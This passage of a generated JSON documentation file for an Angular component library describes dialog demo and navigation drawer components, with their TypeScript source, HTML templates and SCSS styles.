        "id": "component-DialogDemoComponent-adfcd76921ff4b7cc6abafb858297c67649bc90bd4d048629294fac9c85c0a9be440cc528a2dedb64c8150c4f6920fa83ba49354773ec0f8b40511c17c5c3dce",
        "file": "libs/core/src/lib/styles.stories.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "app-dialog-demo",
        "styleUrls": [],
        "styles": [],
        "template": "  <button mat-button\n          (click)=\"show(tmpl)\">Show dialog\n  </button>\n  <ng-template #tmpl>\n    <h3 mat-dialog-title>Dialog Title</h3>\n    <mat-dialog-content [class.scroll-lines]=\"separatorLines\">\n      <ul style=\"padding-left: 12px\">\n        <li>Dialog actions should (nearly) always be text-buttons (never raised).</li>\n        <ul>\n          <li>Exception is e.g to confirm a deletion, in which case you can use \"mat-stroked-button\" with color=\"warn\"</li>\n        </ul>\n        <li>Dialog title should always be with an h3 element</li>\n        <li>Dialog textual content should always be done using paragraphs (&lt;p&gt;)</li>\n      </ul>\n      <p>Configuration:</p>\n      <code><pre>\n  const dialogConfig = new MatDialogConfig();\n  dialogConfig.width = '560px';\n  dialogConfig.panelClass = 'sto-dialog';\n  @NgModule(\n      ...,\n  providers: [\n        {{ '{' }}\n        provide: MAT_DIALOG_DEFAULT_OPTIONS,\n    useValue: dialogConfig\n        {{ '}' }}],\n  ...\n  )\n  export class AppModule...\n</pre>\n      </code>\n    </mat-dialog-content>\n    <mat-dialog-actions>\n      <button mat-button\n              mat-dialog-close>Cancel\n      </button>\n      <button mat-button\n              mat-dialog-close\n              color=\"primary\">Save\n      </button>\n    </mat-dialog-actions>\n  </ng-template>\n",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "separatorLines",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 61,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [],
        "methodsClass": [
          {
            "name": "show",
            "args": [
              {
                "name": "tmpl",
                "type": "TemplateRef<>",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 63,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "tmpl",
                "type": "TemplateRef<>",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\r\nimport { moduleMetadata } from '@storybook/angular';\r\nimport { MatCardModule } from '@angular/material/card';\r\nimport { MatDialog, MatDialogModule } from '@angular/material/dialog';\r\nimport { Component, Input, TemplateRef } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatTabsModule } from '@angular/material/tabs';\r\n\r\n@Component({\r\n  selector: 'app-dialog-demo',\r\n  template: `\r\n    <button mat-button\r\n            (click)=\"show(tmpl)\">Show dialog\r\n    </button>\r\n    <ng-template #tmpl>\r\n      <h3 mat-dialog-title>Dialog Title</h3>\r\n      <mat-dialog-content [class.scroll-lines]=\"separatorLines\">\r\n        <ul style=\"padding-left: 12px\">\r\n          <li>Dialog actions should (nearly) always be text-buttons (never raised).</li>\r\n          <ul>\r\n            <li>Exception is e.g to confirm a deletion, in which case you can use \"mat-stroked-button\" with color=\"warn\"</li>\r\n          </ul>\r\n          <li>Dialog title should always be with an h3 element</li>\r\n          <li>Dialog textual content should always be done using paragraphs (&lt;p&gt;)</li>\r\n        </ul>\r\n        <p>Configuration:</p>\r\n        <code><pre>\r\n    const dialogConfig = new MatDialogConfig();\r\n    dialogConfig.width = '560px';\r\n    dialogConfig.panelClass = 'sto-dialog';\r\n    @NgModule(\r\n        ...,\r\n    providers: [\r\n          {{ '{' }}\r\n          provide: MAT_DIALOG_DEFAULT_OPTIONS,\r\n      useValue: dialogConfig\r\n          {{ '}' }}],\r\n    ...\r\n    )\r\n    export class AppModule...\r\n  </pre>\r\n        </code>\r\n      </mat-dialog-content>\r\n      <mat-dialog-actions>\r\n        <button mat-button\r\n                mat-dialog-close>Cancel\r\n        </button>\r\n        <button mat-button\r\n                mat-dialog-close\r\n                color=\"primary\">Save\r\n        </button>\r\n      </mat-dialog-actions>\r\n    </ng-template>\r\n  `\r\n})\r\nclass DialogDemoComponent {\r\n  @Input()\r\n  separatorLines: boolean;\r\n\r\n  show(tmpl: TemplateRef<unknown>) {\r\n    this.dialog.open(tmpl, {\r\n      width: '560px',\r\n      panelClass: 'sto-dialog'\r\n    });\r\n  }\r\n\r\n  constructor(private dialog: MatDialog) {\r\n  }\r\n}\r\n\r\nexport default {\r\n  title: 'core/Styles',\r\n  decorators: [\r\n    moduleMetadata({\r\n      imports: [ MatCardModule, MatTabsModule, MatDialogModule, CommonModule, BrowserAnimationsModule, MatButtonModule, MatIconModule ],\r\n      declarations: [ DialogDemoComponent ]\r\n    })\r\n  ],\r\n  argTypes: {\r\n    template: { control: { disable: true } }\r\n  }\r\n} as Meta;\r\n\r\nexport const StoCard: Story<{ withStyles: boolean }> = (args) => ( {\r\n  props: { ...args },\r\n  template: `<mat-card [class.sto-card]=\"withStyles\">\r\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\r\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\r\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\r\n</mat-card>`\r\n} );\r\nStoCard.args = {\r\n  withStyles: true\r\n};\r\n\r\nexport const StoDialog: Story<Record<string, unknown>> = (args) => ( {\r\n  props: { ...args },\r\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\r\n} );\r\nStoDialog.args = {\r\n  separatorLines: false\r\n};\r\n\r\nexport const StoTheme: Story<Record<string, unknown>> = args => ( {\r\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\r\n  styles: [\r\n    `\r\n    .container { display: flex; }\r\n    .container > div {\r\n     flex: 0 1 auto;\r\n     padding-left: 16px;\r\n     }\r\n    `\r\n  ],\r\n  template: `\r\n  <mat-tab-group>\r\n  <mat-tab label=\"Buttons\">\r\n    <mat-card class=\"sto-card\">\r\n    <div *ngFor=\"let color of colors\">\r\n      <mat-card-subtitle class=\"sto-card__subtitle\">\r\n    <h2>{{ color }}</h2>\r\n</mat-card-subtitle>\r\n    <button mat-button [color]=\"color\">Mat Button</button>\r\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\r\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\r\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\r\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\r\n</div>\r\n</mat-card>\r\n  </mat-tab>\r\n  <mat-tab label=\"Cards\">\r\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\r\n  <mat-card-title>{{ c }}</mat-card-title>\r\n</mat-card>\r\n</mat-tab>\r\n<mat-tab label=\"Text\">\r\n<mat-card class=\"sto-card\">\r\n    <div class=\"container\">\r\n    <div>\r\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\r\n</div>\r\n<div>\r\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\r\n    &lt;span&gt; {{ color }}\r\n</span>\r\n</div>\r\n<div>\r\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\r\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\r\n</h2>\r\n</div>\r\n</div>\r\n</mat-card>\r\n</mat-tab>\r\n</mat-tab-group>\r\n  `,\r\n} );\r\n/*StoTheme.argTypes = {\r\n  color: { control: { type: 'select', options: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] }, defaultValue: 'primary' },\r\n};*/\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "dialog",
              "type": "MatDialog",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 68,
          "jsdoctags": [
            {
              "name": "dialog",
              "type": "MatDialog",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      },
      {
        "name": "NavDrawerComponent",
        "id": "component-NavDrawerComponent-4689823d12ec0ca9c06b09d63dc25c61d57bc83ac402208a1af48064fae1a0bba222e10dc964166b53bbd586396a524518b2dc20d014adfda57f93d50156f588",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-nav-drawer",
        "styleUrls": [
          "./nav-drawer.component.scss",
          "./nav-drawer.theme.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./nav-drawer.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "collapsed",
            "defaultValue": "false",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 18,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "navigationItems",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 20,
            "type": "Array<Navigation>",
            "decorators": []
          },
          {
            "name": "withAppHeader",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 22,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "headerOffset",
            "defaultValue": "64",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 23,
            "modifierKind": [
              123
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "ngAfterViewInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 28,
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { AfterViewInit, ChangeDetectionStrategy, ChangeDetectorRef, Component, Input, ViewEncapsulation } from '@angular/core';\r\nimport { Navigation } from './navigation';\r\nimport { StoThemeService } from '@ngx-stoui/common';\r\nimport { overlayAnimation } from '../animation';\r\n\r\n@Component({\r\n  selector: 'sto-nav-drawer',\r\n  templateUrl: './nav-drawer.component.html',\r\n  styleUrls: [ './nav-drawer.component.scss', './nav-drawer.theme.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  animations: [\r\n    overlayAnimation\r\n  ]\r\n})\r\nexport class NavDrawerComponent implements AfterViewInit {\r\n  @Input()\r\n  collapsed = false;\r\n  @Input()\r\n  navigationItems: Array<Navigation>;\r\n  @Input()\r\n  withAppHeader: boolean;\r\n  public headerOffset = 64;\r\n\r\n  constructor(private themeService: StoThemeService, private cdr: ChangeDetectorRef) {\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    this.themeService\r\n      .getActiveTypography()\r\n      .subscribe(typography => {\r\n        this.headerOffset = typography.name === 'small' ? 48 : 64;\r\n        this.cdr.detectChanges();\r\n      });\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "$transition: width ease 250ms;\r\n$size: 64px;\r\n$height: 48px;\r\n.mat-menu-item.no-hover {\r\n  font-weight: bold;\r\n}\r\n\r\n.sto-nav-drawer {\r\n  position: fixed;\r\n  z-index: 50;\r\n  padding-top: 8px;\r\n  left: 0;\r\n  top: 0;\r\n  display: flex;\r\n  flex-direction: column;\r\n  justify-content: space-between;\r\n  align-items: flex-end;\r\n\r\n  transition: $transition;\r\n\r\n  div.sto-nav-drawer-items {\r\n    overflow-y: auto;\r\n    overflow-x: hidden;\r\n  }\r\n\r\n  .expansion-button {\r\n    height: $height;\r\n    padding-left: 16px;\r\n\r\n  }\r\n\r\n  .disabled {\r\n    cursor: not-allowed;\r\n  }\r\n\r\n  .logo {\r\n    width: 100%;\r\n    padding-bottom: 8px;\r\n    padding-left: 20px;\r\n  }\r\n\r\n  div.sto-nav-drawer-items {\r\n    width: 100%;\r\n  }\r\n\r\n  &--collapsed {\r\n\r\n    width: $size;\r\n\r\n    .expansion-button {\r\n      padding-left: 12px;\r\n    }\r\n\r\n    > div.sto-nav-drawer-items {\r\n\r\n      .sto-nav-drawer--collapsed__item {\r\n        height: $height - 1px;\r\n        border-bottom-style: solid;\r\n        border-bottom-width: 2px;\r\n        /*        display: flex;\r\n                justify-content: center;\r\n                align-items: center;*/\r\n\r\n        .mat-button {\r\n          min-width: 64px;\r\n          width: 64px;\r\n          margin: 0;\r\n          height: $height - 1px;\r\n        }\r\n\r\n        a.mat-button {\r\n          /*          display: flex;\r\n                    justify-content: center;\r\n                    align-items: center;*/\r\n        }\r\n      }\r\n    }\r\n  }\r\n\r\n  &--expanded {\r\n    width: 316px;\r\n\r\n    .expansion-button {\r\n    }\r\n\r\n    &__item {\r\n      cursor: pointer;\r\n      width: 316px;\r\n      padding: 12px 24px;\r\n      display: grid;\r\n      grid-template-columns: 24px 1fr 24px;\r\n      grid-column-gap: 20px;\r\n    }\r\n  }\r\n\r\n  sto-nav-drawer-item {\r\n    display: block;\r\n    line-height: 24px;\r\n  }\r\n\r\n  sto-nav-drawer-list {\r\n    display: flex;\r\n    flex-direction: column;\r\n    margin-left: 56px;\r\n    overflow: hidden;\r\n\r\n    a {\r\n      text-decoration: none;\r\n    }\r\n\r\n    sto-nav-drawer-list-item {\r\n      display: flex;\r\n      flex-direction: column;\r\n      justify-content: center;\r\n      height: 48px;\r\n      border-left: 2px solid;\r\n      cursor: pointer;\r\n\r\n      a.active {\r\n        margin-left: -2px;\r\n        font-weight: 700;\r\n\r\n        span {\r\n          border-left-width: 2px;\r\n          border-left-style: solid;\r\n        }\r\n      }\r\n\r\n      a {\r\n        line-height: 48px;\r\n        height: 48px;\r\n        display: flex;\r\n        align-items: center;\r\n        justify-content: space-between;\r\n        padding-right: 24px;\r\n      }\r\n\r\n      a span {\r\n        line-height: 16px;\r\n        padding-left: 14px;\r\n      }\r\n    }\r\n\r\n  }\r\n}\r\n\r\n.sto-drawer__overlay {\r\n  position: fixed;\r\n  top: 0;\r\n  height: 100vh;\r\n  width: 100vw;\r\n  z-index: 40;\r\n  opacity: 0.08;\r\n}\r\n\r\n.sto-nav-drawer-menu + div {\r\n  left: 48px !important;\r\n\r\n  a.mat-menu-item:hover {\r\n    text-shadow: 0px 0px 1px black;\r\n  }\r\n\r\n  .mat-menu-content .mat-divider {\r\n    margin-top: 0;\r\n    margin-bottom: 0;\r\n  }\r\n}\r\n",
            "styleUrl": "./nav-drawer.component.scss"
          },
          {
            "data": "@use '@angular/material' as mat;\r\n@import \"libs/core/src/style/theme/theme\";\r\n@import \"libs/core/src/style/theme/typography\";\r\n\r\n\r\nbody {\r\n  .mat-menu-item.no-hover {\r\n    color: var(--text-secondary);\r\n  }\r\n\r\n  .mat-menu-item.no-hover:hover:not([disabled]) {\r\n    background-color: var(--bg-default);\r\n  }\r\n\r\n  a.mat-menu-item.active-menu-route {\r\n    background-color: var(--primary-fill-activated);\r\n    color: var(--primary-resting);\r\n  }\r\n  a.mat-menu-item:hover {\r\n    text-shadow: 0 0 1px var(--text);\r\n  }\r\n\r\n\r\n  .sto-nav-drawer {\r\n    background-color: var(--bg-default);\r\n    border-right: 1px solid var(--divider);\r\n\r\n    a.mat-button {\r\n      color: var(--text-secondary);\r\n\r\n      &.active {\r\n        background-color: var(--primary-fill-activated)\r\n      }\r\n\r\n      .mat-icon {\r\n        color: var(--text-secondary);\r\n      }\r\n    }\r\n\r\n    button:not(.mat-button-disabled) .mat-icon {\r\n      color: var(--text-secondary);\r\n    }\r\n\r\n    a.sto-nav-drawer--expanded__item {\r\n      text-decoration: none;\r\n\r\n      &:hover {\r\n        background-color: var(--bg-hover);\r\n      }\r\n\r\n      &.active {\r\n        font-weight: bold;\r\n      }\r\n    }\r\n\r\n    .sto-nav-drawer--expanded__item:not(.disabled) .mat-icon {\r\n      color: var(--text-secondary);\r\n    }\r\n\r\n    sto-nav-drawer-list-item {\r\n      border-color: var(--bg-primary);\r\n\r\n      a.active span {\r\n        color: var(--text-secondary);\r\n      }\r\n\r\n      &:hover {\r\n        background-color: var(--bg-hover);\r\n      }\r\n    }\r\n\r\n    .sto-nav-drawer--collapsed__item {\r\n      border-bottom-color: var(--divider);\r\n    }\r\n\r\n    a:not(.disabled) {\r\n      color: var(--text);\r\n    }\r\n\r\n    a.active {\r\n      color: var(--text-secondary);\r\n    }\r\n\r\n    .disabled {\r\n      color: var(--text-disabled);\r\n\r\n      a {\r\n        color: var(--text-disabled);\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\n\r\n@mixin navigation-drawer-typography($config) {\r\n  .sto-nav-drawer {\r\n    sto-nav-drawer-item {\r\n      font-size: mat.font-size($config, subheading-1);\r\n      line-height: mat.line-height($config, subheading-1);\r\n    }\r\n  }\r\n  .sto-nav-drawer-menu + div .mat-menu-item {\r\n    font-size: mat.font-size($config, subheading-1);\r\n  }\r\n}\r\n\r\n.mat-typography:not(.sto-sm-typography):not(.sto-l-typography) {\r\n  @include navigation-drawer-typography($sto-typography);\r\n}\r\n\r\n.mat-typography.sto-sm-typography {\r\n  @include navigation-drawer-typography($sto-sm-typography);\r\n}\r\n\r\n.mat-typography.sto-l-typography {\r\n  @include navigation-drawer-typography($sto-l-typography);\r\n}\r\n",
            "styleUrl": "./nav-drawer.theme.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "themeService",
              "type": "StoThemeService",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 23,
          "jsdoctags": [
            {
              "name": "themeService",
              "type": "StoThemeService",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "AfterViewInit"
        ],
        "templateData": "<nav class=\"sto-nav-drawer\"\r\n     [style.height]=\"withAppHeader ? 'calc(100vh - ' + headerOffset +  'px)' : '100vh'\"\r\n     [style.top.px]=\"withAppHeader ? headerOffset : 0\"\r\n     [class.sto-nav-drawer--collapsed]=\"collapsed\"\r\n     [class.sto-nav-drawer--expanded]=\"!collapsed\">\r\n  <div class=\"sto-nav-drawer-items\">\r\n    <div class=\"expansion-button\"\r\n         [style.width]=\"collapsed ? '100%' : '100%'\">\r\n      <button mat-icon-button\r\n              (click)=\"collapsed = !collapsed\">\r\n        <mat-icon>{{collapsed ? 'last_page' : 'first_page'}}</mat-icon>\r\n      </button>\r\n    </div>\r\n    <sto-nav-drawer-item [collapsed]=\"collapsed\"\r\n                         *ngFor=\"let item of navigationItems\"\r\n                         [navigationItem]=\"item\"></sto-nav-drawer-item>\r\n  </div>\r\n  <div class=\"logo\">\r\n    <mat-icon svgIcon=\"equinor\"></mat-icon>\r\n  </div>\r\n</nav>\r\n<div @overlay\r\n     class=\"sto-drawer__overlay\"\r\n     [style.left]=\"0\"\r\n     *ngIf=\"!collapsed\"\r\n     (click)=\"collapsed = !collapsed\"></div>\r\n"
      },
      {
        "name": "NavDrawerItemComponent",
        "id": "component-NavDrawerItemComponent-12874b4690a68b6322e6ad43f8ae6a5ae58e1f7dcaa6fb46a7d11f6e835cad98bd5761fd05b731734faf92029c2ad54fcfc05d79cc5dcd17be94e00095dcc363",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer-item/nav-drawer-item.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-nav-drawer-item",
        "styleUrls": [],
        "styles": [],
        "templateUrl": [
          "./nav-drawer-item.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "collapsed",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 32,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "navigationItem",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 30,
            "type": "Navigation",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "_expansionState",
            "defaultValue": "'collapsed'",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "\"collapsed\" | \"expanded\"",
            "optional": false,
            "description": "",
            "line": 33,
            "modifierKind": [
              121
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "toggleExpansionState",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 41,
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { ChangeDetectionStrategy, Component, Input, ViewEncapsulation } from '@angular/core';\r\nimport { Navigation } from '../navigation';\r\nimport { animate, state, style, transition, trigger } from '@angular/animations';\r\nimport { EXPANSION_PANEL_ANIMATION_TIMING } from '@angular/material/expansion';\r\n\r\n@Component({\r\n  selector: 'sto-nav-drawer-item',\r\n  templateUrl: './nav-drawer-item.component.html',\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  animations: [\r\n      /** Animation that rotates the indicator arrow. */\r\n      trigger('indicatorRotate', [\r\n        state('collapsed, void', style({transform: 'rotate(0deg)'})),\r\n        state('expanded', style({transform: 'rotate(180deg)'})),\r\n        transition('expanded <=> collapsed, void => collapsed',\r\n          animate(EXPANSION_PANEL_ANIMATION_TIMING)),\r\n      ]),\r\n      /** Animation that expands and collapses the panel content. */\r\n      trigger('bodyExpansion', [\r\n        state('collapsed, void', style({height: '0px', visibility: 'hidden'})),\r\n        state('expanded', style({height: '*', visibility: 'visible'})),\r\n        transition('expanded <=> collapsed, void => collapsed',\r\n          animate(EXPANSION_PANEL_ANIMATION_TIMING)),\r\n      ]),\r\n  ]\r\n})\r\nexport class NavDrawerItemComponent {\r\n  @Input()\r\n  navigationItem: Navigation;\r\n  @Input()\r\n  collapsed: boolean;\r\n  private _expansionState: 'collapsed' | 'expanded' = 'collapsed';\r\n  public get expansionState() {\r\n    return this.collapsed ? 'collapsed' : this._expansionState;\r\n  }\r\n  public set expansionState(state) {\r\n    this._expansionState = state;\r\n  }\r\n\r\n  toggleExpansionState() {\r\n    if ( !this.navigationItem.children || this.navigationItem.children.length === 0 ) {\r\n      return;\r\n    }\r\n    this.expansionState = this.expansionState === 'collapsed' ? 'expanded' : 'collapsed';\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "accessors": {
          "expansionState": {
            "name": "expansionState",
            "setSignature": {
              "name": "expansionState",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "state",
                  "type": "",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 37,
              "jsdoctags": [
                {
                  "name": "state",
                  "type": "",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "expansionState",
              "type": "",
              "returnType": "",
              "line": 34
            }
          }
        },
        "templateData": "<div class=\"sto-nav-drawer--collapsed__item\"\r\n     *ngIf=\"collapsed\">\r\n  <a mat-button\r\n     [title]=\"navigationItem.label\"\r\n     routerLinkActive=\"active\"\r\n     [href]=\"navigationItem.link\"\r\n     *ngIf=\"navigationItem.link && !navigationItem.children\">\r\n    <mat-icon>{{ navigationItem.icon }}</mat-icon>\r\n  </a>\r\n  <a mat-button\r\n     [title]=\"navigationItem.label\"\r\n     routerLinkActive=\"active\"\r\n     [routerLink]=\"navigationItem.route\"\r\n     *ngIf=\"navigationItem.route && !navigationItem.children\">\r\n    <mat-icon>{{ navigationItem.icon }}</mat-icon>\r\n  </a>\r\n  <button mat-button\r\n          [title]=\"navigationItem.label\"\r\n          *ngIf=\"navigationItem.children\"\r\n          [matMenuTriggerFor]=\"menu\"\r\n          [disabled]=\"navigationItem.disabled\">\r\n    <mat-icon>{{ navigationItem.icon }}</mat-icon>\r\n  </button>\r\n  <mat-menu #menu=\"matMenu\"\r\n            xPosition=\"after\"\r\n            [overlapTrigger]=\"true\"\r\n            backdropClass=\"sto-nav-drawer-menu\">\r\n    <span mat-menu-item\r\n          class=\"no-hover\"\r\n          (click)=\"$event.stopPropagation()\"\r\n          [disableRipple]=\"true\"\r\n          *ngIf=\"navigationItem.title\"\r\n          style=\"cursor: default;\">{{ navigationItem.title }}</span>\r\n    <mat-divider *ngIf=\"navigationItem.title\"></mat-divider>\r\n    <ng-container *ngFor=\"let item of navigationItem.children\">\r\n      <a [routerLink]=\"item.route\"\r\n         routerLinkActive=\"active-menu-route\"\r\n         mat-menu-item\r\n         *ngIf=\"item.route\">\r\n        {{ item.label }}\r\n      </a>\r\n      <a [href]=\"item.link\"\r\n         mat-menu-item\r\n         [attr.target]=\"item.target || null\"\r\n         *ngIf=\"item.link\">\r\n        {{ item.label }}\r\n      </a>\r\n    </ng-container>\r\n  </mat-menu>\r\n</div>\r\n<div class=\"sto-nav-drawer--expanded__item\"\r\n     *ngIf=\"!collapsed && navigationItem.children\"\r\n     [class.disabled]=\"navigationItem.disabled\"\r\n     (click)=\"toggleExpansionState()\">\r\n  <mat-icon>{{ navigationItem.icon }}</mat-icon>\r\n  <a>{{ navigationItem.label }}</a>\r\n  <mat-icon [@indicatorRotate]=\"expansionState\">expand_more</mat-icon>\r\n</div>\r\n<a class=\"sto-nav-drawer--expanded__item\"\r\n   [href]=\"navigationItem.link\"\r\n   matRipple\r\n   *ngIf=\"!collapsed && !navigationItem.children && navigationItem.link\"\r\n   [class.disabled]=\"navigationItem.disabled\">\r\n  <mat-icon>{{ navigationItem.icon }}</mat-icon>\r\n  <span>{{ navigationItem.label }}</span>\r\n</a>\r\n<a class=\"sto-nav-drawer--expanded__item\"\r\n   [routerLink]=\"navigationItem.route\"\r\n   routerLinkActive=\"active\"\r\n   matRipple\r\n   *ngIf=\"!collapsed && !navigationItem.children && navigationItem.route\"\r\n   [class.disabled]=\"navigationItem.disabled\">\r\n  <mat-icon>{{ navigationItem.icon }}</mat-icon>\r\n  <span>{{ navigationItem.label }}</span>\r\n</a>\r\n<sto-nav-drawer-list [@bodyExpansion]=\"expansionState\"\r\n                     *ngIf=\"navigationItem.children\"\r\n                     [navigationItems]=\"navigationItem.children\"></sto-nav-drawer-list>\r\n\r\n\r\n"
      },
      {
        "name": "NavDrawerListComponent",
        "id": "component-NavDrawerListComponent-5b5e5c683c0b4b36d64d26597b8c4040e8e401d990b8ae1801f490b7c5b1081d818bb1e63cf55a776eb9d410bf6c247eb04105af31de6e092653a145be1de355",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer-list/nav-drawer-list.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-nav-drawer-list",
        "styleUrls": [],
        "styles": [],
        "templateUrl": [
          "./nav-drawer-list.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "navigationItems",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 12,
            "type": "Array<NavigationChild>",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, ViewEncapsulation, ChangeDetectionStrategy, Input } from '@angular/core';\r\nimport { NavigationChild } from '../navigation';\r\n\r\n@Component({\r\n  selector: 'sto-nav-drawer-list',\r\n  templateUrl: './nav-drawer-list.component.html',\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class NavDrawerListComponent {\r\n  @Input()\r\n  navigationItems: Array<NavigationChild>;\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "templateData": "<sto-nav-drawer-list-item class=\"sto-nav-drawer-list\"\r\n                          *ngFor=\"let item of navigationItems\"\r\n                          [navigationItem]=\"item\"></sto-nav-drawer-list-item>\r\n"
      },
      {
        "name": "NavDrawerListItemComponent",
        "id": "component-NavDrawerListItemComponent-50a6768cc7c5cc7ceee10baada3c6c396cbb8026ef88c4b40c415177d49e2f77221343fb60a6246774e88b4eb94520f723235341308c5007cefef7a4bf60e7aa",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer-list-item/nav-drawer-list-item.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
